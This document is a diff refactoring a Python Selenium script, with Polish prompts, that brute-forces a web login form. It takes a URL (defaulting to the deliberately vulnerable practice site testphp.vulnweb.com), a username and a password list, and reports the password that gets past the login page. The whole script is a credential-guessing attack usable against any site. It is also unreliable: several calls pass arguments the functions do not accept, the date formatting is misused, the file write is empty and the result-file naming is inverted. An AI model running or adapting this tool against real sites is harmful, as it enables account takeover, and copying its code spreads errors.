@@ -6,16 +6,14 @@ from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.support import expected_conditions as EC
 from datetime import datetime
 
-site = input("Podaj adres strony:")
-if site == "test":
-   site = "http://testphp.vulnweb.com/login.php"
-else:
-    site = site
 
-driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
-driver.get(site)
-
-"""Obłsuga listy hasłę"""
+def get_url():
+    site = input("Podaj adres strony:")
+    if site == "test":
+        site = "http://testphp.vulnweb.com/login.php"
+    else:
+        site = site
+    return site
 
 
 def read_list_from_file(filename):
@@ -25,49 +23,99 @@ def read_list_from_file(filename):
     return read_list
 
 
-username = input("Podaj nazwę użytkownik:")  #test
-if username != "":
-    pass
-else:
-    print("Nazwa użytkownika nie może być pusta:")
-
-passfile = input("Podaj nazwę pliku haseł :") #passw
-if passfile == "":
-    passfile ="pass_list"
-else:
-    passfiele = passfile
+def get_username():
+    username = input("Podaj nazwę użytkownik:")  # test
+    if username != "":
+        pass
+    else:
+        print("Nazwa użytkownika nie może być pusta:")
+    return username
 
 
-"""Osługa strony"""
-cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
-paswords = read_list_from_file(passfile)
-
-username_driver = input("Podaj nazwę elmentu z nazwą użytkownika: ")
-if username_driver == "":
-    username_driver = "uname"
-else:
-    username_driver = username_driver
-
-password_driver = input("Podaj nazwę elmentu z hasłem: ")
-if password_driver == "":
-    password_driver = "pass"
-else:
-    password_driver = password_driver
+def get_password_file_name():
+    passfile = input("Podaj nazwę pliku haseł :")  # passw
+    if passfile == "":
+        passfile = "pass_list"
+    else:
+        passfile = passfile
+    return passfile
 
 
-for password in paswords:
-    driver.find_element(by=By.NAME, value=username_driver).send_keys(username)
-    driver.find_element(by=By.NAME, value=password_driver).send_keys(password)
-    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
-    try:  # obsługa błedów
-        WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
-    except:
-        print("Correct password is ==> " + password + " <==")
+def get_username_driver():
+    username_driver = input("Podaj nazwę elmentu z nazwą użytkownika: ")
+    if username_driver == "":
+        username_driver = "uname"
+    else:
+        username_driver = username_driver
+    return username_driver
 
-# test_date = datetime.now()
-# test_date_file = datetime.now.strptime("2016-04-15T08:27:18-0500", "%Y-%m-%dT%H-%M-%S%z")
 
-file_write = open("ok_password" + str(test_date_file) + ".txt", "w")
-file_write.write("Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <==")
+def get_password_driver():
+    password_driver = input("Podaj nazwę elmentu z hasłem: ")
+    if password_driver == "":
+        password_driver = "pass"
+    else:
+        password_driver = password_driver
+    return password_driver
 
-driver.close()
+
+def get_submit_driver():
+    return "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"
+
+
+def find_correct_password(driver, passwords_list, username,cssconfig):
+    correct_password = ""
+    for password in passwords_list:
+        driver.find_element(by=By.NAME, value=cssconfig.username_css).send_keys(username)
+        driver.find_element(by=By.NAME, value=cssconfig.password_css).send_keys(password)
+        driver.find_element(by=By.CSS_SELECTOR, value=cssconfig.submit_css).click()
+        try:  # obsługa błedów
+            WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.NAME, "uname")))
+        except:
+            print("Correct password is ==> " + password + " <==")
+            correct_password = password
+    return correct_password
+
+
+def save_file(password):
+    test_date = datetime.now()
+    test_date_file = datetime.now().strftime("2016-04-15T08:27:18-0500", "%Y-%m-%dT%H-%M-%S%z")
+
+
+    if password == "":
+        file_name = "ok_password" + str(test_date_file) + ".txt"
+    else:
+        file_name = "password_not_found" + str(test_date_file) + ".txt"
+
+    file_write = open(file_name, "w")
+    file_message = "Test date: " + str(test_date) + " \n Correct password is ==> " + password + " <=="
+    file_write.write()
+
+
+def main():
+    url = get_url()
+    username = get_username()
+    password_file_name = get_password_file_name()
+    username_css_locator = get_username_driver()
+    password_css_locator = get_password_driver()
+    submit_css_locator = get_submit_driver()
+    paswords_list = read_list_from_file(password_file_name)
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
+    driver.get(url)
+    cssconfig = CssConfig(username_css_locator, password_css_locator, submit_css_locator)
+
+    correct_password = find_correct_password(driver=driver,
+                                             passwords_list=paswords_list,
+                                             username=username,
+                                             cssconfig = cssconfig,
+
+                                             username_driver=username_css_locator,
+                                             password_driver=password_css_locator,
+                                             cssclick=submit_css_locator)
+    driver.close()
+    save_file(correct_password)
+
+class CssConfig:
+    username_css = ""
+    password_css = ""
+    submit_css = ""
